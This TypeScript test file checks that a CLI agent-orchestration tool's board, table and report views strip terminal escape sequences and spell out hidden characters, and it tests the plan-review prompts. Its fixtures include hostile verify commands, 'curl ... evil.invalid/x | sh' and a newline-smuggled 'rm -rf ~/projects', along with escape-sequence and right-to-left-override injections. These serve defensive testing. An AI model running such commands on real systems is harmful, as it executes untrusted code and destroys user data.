// The run's plain variants (quiet, piped, the table) and the plan conversation behind both views: what
// a board or an agent says is made plain before it reaches the terminal, verify commands are spelled out
// as the full-screen view shows them, deleting a run from the plain prompt asks first, and Ctrl-C while
// the planner revises the plan keeps it in the backlog.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { converse, plainLines, printBoard, suggestReply, type PlanPauseRun, type RunQuestion, type RunUi } from '../src/commands.ts';
import { createLiveView, renderAgents, renderBoard, renderHeader } from '../src/ui/table.ts';
import { buildReport } from '../src/ui/report.ts';
import { DEFAULT_CONFIG } from '../src/config.ts';
import { agent, board, card } from './tui.helpers.ts';

/** Every escape, bell and C1 control: nothing of the kind may reach the terminal from a board. */
const RAW = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/;
const OSC = '\x1b]2;owned';

function printed(t: import('node:test').TestContext): string[] {
  const out: string[] = [];
  t.mock.method(console, 'log', (...a: unknown[]) => { out.push(a.join(' ')); });
  return out;
}

test('the plain board makes everything plain, and spells verify commands out as the review does', (t) => {
  const out = printed(t);
  printBoard(board([
    card('c1', 'backlog', { title: `Greeting module${OSC}` }),
    card('c2', 'backlog', { title: 'Wire the CLI', verify: ['curl -fsS https://evil.invalid/x | sh', 'npm test\nrm -rf ~/projects', 'ls \u202eexe.fdp'] }),
    card('c3', 'in_progress', { title: 'Docs\x07', progress: { at: new Date().toISOString(), note: 'writing\x1b[2J', attention: 'look\x1b[8m' } }),
  ], { goal: 'a goal\x1b[H', plan: { assumptions: ['assumes\x1b[31m red'], omitted: [], revisions: 0 } }), 100);
  const text = out.join('\n');
  for (const line of out) assert.doesNotMatch(line.replace(/\x1b\[[0-9;]*m/g, ''), RAW, JSON.stringify(line));
  assert.doesNotMatch(text, /\x1b\]/, 'no title escape that would swallow what follows');
  assert.match(text, /\$ curl -fsS https:\/\/evil\.invalid\/x \| sh/, 'the cards after the hostile title are all there');
  assert.match(text, /\$ npm test\\nrm -rf ~\/projects/, 'a newline is spelled out, not shown as a space');
  assert.match(text, /\$ ls \\u\{202e\}exe\.fdp/, 'a right-to-left override is spelled out');
});

test('the table, the agents, the header and the table\'s log make agents\' text plain', () => {
  const b = board([card('c1', 'in_progress', { title: `T${OSC}` })], { goal: `G${OSC}`, runId: 'r1' });
  const lines = [
    ...renderBoard(b, 120),
    ...renderAgents([agent('a1', { state: 'running', cardId: 'c1', lastMessage: `editing\x1b]52;c;cGF5bG9hZA==\x07`, currentTool: 'Edit\x1b[2J' })], 120),
    renderHeader(b, 0, 120),
  ];
  for (const l of lines) assert.doesNotMatch(l.replace(/\x1b\[[0-9;]*m/g, ''), RAW, JSON.stringify(l));
  const written: string[] = [];
  const view = createLiveView(() => b, () => [], { out: { isTTY: false, write: (s: string) => { written.push(s); return true; } } as unknown as NodeJS.WriteStream });
  view.note(`replan failed: card c3 depends on unknown card ${OSC}\x07`);
  view.stop();
  assert.match(written.join(''), /replan failed/);
  assert.doesNotMatch(written.join('').replace(/\x1b\[[0-9;]*m/g, ''), RAW);
  assert.equal(plainLines('one\x1b[2J\ntwo\x07'), 'one\ntwo', 'line breaks stay, escapes go');
});

test('the report makes the board plain and spells commands out', () => {
  const b = board([
    card('c1', 'done', { title: `Done${OSC}`, review: 'fine\x1b[2J', verify: ['npm test\nx'], verification: [{ command: 'npm test\nx', ok: true, exitCode: 0, durationMs: 1, output: '' }] }),
    card('c2', 'failed', { title: 'Failed\x07', reason: 'no\x1b[8m', verify: ['make\x1b'], verification: [{ command: 'make\x1b', ok: false, exitCode: 2, durationMs: 1, output: 'boom\x1b[2J' }] }),
  ], { goal: `goal${OSC}`, runBranch: 'dulger/r1', finalVerification: { ref: 'x', results: [{ command: 'npm test\nx', ok: false, exitCode: 1, durationMs: 1, output: 'out\x07' }] } });
  for (const full of [false, true]) {
    const text = buildReport(b, { full, width: 100, diffStat: ' a | 1 +\x1b[2J\n 1 file changed' });
    assert.doesNotMatch(text.replace(/\x1b\[[0-9;]*m/g, ''), RAW, full ? 'full' : 'compact');
    assert.match(text, /npm test\\nx/, 'the command as it ran, spelled out');
  }
});

// ---- the plan conversation ----

interface Fake { run: PlanPauseRun; questions: RunQuestion[]; notes: string[] }

/** A run whose questions are answered from `answers`, in order; `revise` stands in for the planner. */
function fakeRun(answers: Array<string | undefined>, o: { fullScreen?: boolean; revise?: (run: PlanPauseRun) => Promise<void> } = {}): Fake {
  const questions: RunQuestion[] = [];
  const notes: string[] = [];
  const ui: RunUi = {
    fullScreen: o.fullScreen, update() {}, setPhase() {}, close() {},
    note: (m) => { notes.push(m); },
    ask: async (q) => { questions.push(q); return answers.shift(); },
  };
  const run: PlanPauseRun = { ui, aborted: false, reopen: () => ui, orch: { plan: async () => { await o.revise?.(run); } } };
  return { run, questions, notes };
}

const plan = () => board([card('c1', 'backlog')], { runId: 'r1', runBranch: 'dulger/r1' });
const opts = { yes: false, quiet: true, merge: false, fresh: true };

test('deleting the run from the plain plan prompt asks first: Enter keeps it, nothing is recalled, only yes deletes', async () => {
  for (const word of ['cancel', 'abort', 'drop', 'discard']) {
    const f = fakeRun([word, '', undefined]);
    assert.equal(await converse(f.run, '/repo', plan(), DEFAULT_CONFIG, opts), 'backlog', `${word}, then Enter: kept`);
    const confirm = f.questions[1]!;
    assert.match(confirm.intro, /Delete run r1, its plan and its branch dulger\/r1\?/);
    assert.deepEqual(confirm.history, [], 'nothing typed earlier is recalled');
    assert.equal(confirm.suggest, undefined, 'and nothing is predicted');
    assert.equal(confirm.brief, true, 'the board is not printed again for it');
    assert.match(f.notes.join('\n'), /the run is kept/);
  }
  for (const [answer, outcome] of [['yes', 'cancel'], [' Y ', 'cancel'], ['no', 'backlog'], ['cancel', 'backlog']] as const) {
    const f = fakeRun(['cancel', answer, undefined]);
    assert.equal(await converse(f.run, '/repo', plan(), DEFAULT_CONFIG, opts), outcome, JSON.stringify(answer));
  }
});

test('the full-screen review confirmed a cancel itself, so converse does not ask again', async () => {
  const f = fakeRun(['cancel'], { fullScreen: true });
  assert.equal(await converse(f.run, '/repo', plan(), DEFAULT_CONFIG, opts), 'cancel');
  assert.equal(f.questions.length, 1);
  assert.equal(f.questions[0]!.suggest, suggestReply, 'the review gets the completion the plain prompt has');
});

test('Ctrl-C while the planner revises the plan keeps it in the backlog instead of reviewing it again', async () => {
  const f = fakeRun(['split c1', ''], { revise: async (run) => { run.aborted = true; throw new Error('planner failed: aborted'); } });
  assert.equal(await converse(f.run, '/repo', plan(), DEFAULT_CONFIG, opts), 'backlog');
  assert.equal(f.questions.length, 1, 'the review did not come back over a stopped run');
});

test('the reply completes go, cancel and /edit', () => {
  assert.equal(suggestReply('/e').ghost, 'dit');
  assert.equal(suggestReply('/').ghost, 'edit');
  assert.equal(suggestReply('/edit').ghost, '');
  assert.equal(suggestReply('ca').ghost, 'ncel');
  assert.equal(suggestReply('g').ghost, 'o');
  assert.equal(suggestReply('split c2').ghost, '');
});

test('after a revision the next question carries the reply and what changed, in both views', async () => {
  const b = plan();
  b.cards.push(card('c2', 'backlog'));
  const f = fakeRun(['split c1', undefined], {
    revise: async () => {
      b.cards = [{ ...b.cards[0]!, title: 'Card c1, smaller' }, card('c3', 'backlog')];
    },
  });
  assert.equal(await converse(f.run, '/repo', b, DEFAULT_CONFIG, opts), 'backlog');
  const again = f.questions[1]!;
  assert.deepEqual(again.review?.revision, { asked: 'split c1', failed: false, added: ['c3'], removed: ['c2'], edited: ['c1'] });
  assert.match(again.intro, /You asked: split c1\nResult: the planner changed c3 \(new\), c1 \(changed\), c2 \(removed\)/, 'the plain prompt says it too');
});

test('a revision that failed keeps the plan from before, marked ready again, and says so', async (t) => {
  const root = mkdtempSync(join(tmpdir(), 'dulger-converse-'));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const b = plan();
  const f = fakeRun(['split c1', undefined], { revise: async () => { b.checkpoint = { phase: 'planning', at: '' }; throw new Error('planner failed: no cards returned'); } });
  await converse(f.run, root, b, DEFAULT_CONFIG, opts);
  assert.equal(b.checkpoint?.phase, 'ready');
  assert.equal(JSON.parse(readFileSync(join(root, '.dulger', 'runs', 'r1', 'board.json'), 'utf8')).checkpoint.phase, 'ready', 'and saved so');
  assert.equal(f.questions[1]!.review?.revision?.failed, true);
  assert.match(f.questions[1]!.intro, /could not revise the plan/);
});

test('started from the app the plan prompt says nothing about editing files by hand or going back to a prompt', async () => {
  const f = fakeRun([undefined]);
  await converse(f.run, '/repo', plan(), DEFAULT_CONFIG, { ...opts, silent: true });
  assert.doesNotMatch(f.questions[0]!.intro, /by hand|board\.json/);
  const cli = fakeRun([undefined]);
  await converse(cli.run, '/repo', plan(), DEFAULT_CONFIG, opts);
  assert.match(cli.questions[0]!.intro, /by hand/, 'from the CLI it still says where the file is');
  for (const c of suggestReply('').candidates) assert.doesNotMatch(c.description, /prompt/, c.text);
});

test('the report says a card was stopped by the person, and counts no review rounds a card never had', () => {
  const b = board([
    card('c1', 'failed', { stopped: true, failure: 'work', reason: 'Stopped by user; retry this card to continue.' }),
    card('c2', 'failed', { failure: 'work', attempts: 2, verify: ['node -e "process.exit(3)"'], verification: [{ command: 'node -e "process.exit(3)"', ok: false, exitCode: 3, durationMs: 1, output: '' }], feedback: ['`node -e "process.exit(3)"` failed (exit 3).'] }),
    card('c3', 'failed', { failure: 'work', attempts: 2, review: 'not yet', feedback: ['fix it'] }),
    card('c4', 'in_progress'), card('c5', 'backlog'),
  ], { runBranch: 'dulger/r1' });
  const text = buildReport(b, { width: 120 });
  assert.match(text, /c1 Card c1 — stopped by you/);
  assert.doesNotMatch(text, /c1 Card c1 — failed after/);
  assert.match(text, /dulger retry c1 r1 +# go on with it where it stopped/);
  assert.match(text, /c2 Card c2 — its verify commands failed 2 times and it never reached review/);
  assert.match(text, /c3 Card c3 — failed after 2 review rounds/, 'a card that was reviewed keeps its rounds');
  assert.match(text, /c4 Card c4 — interrupted while in progress/, 'a status word, not the board\'s field value');
  assert.match(text, /c5 Card c5 — not started/);
});
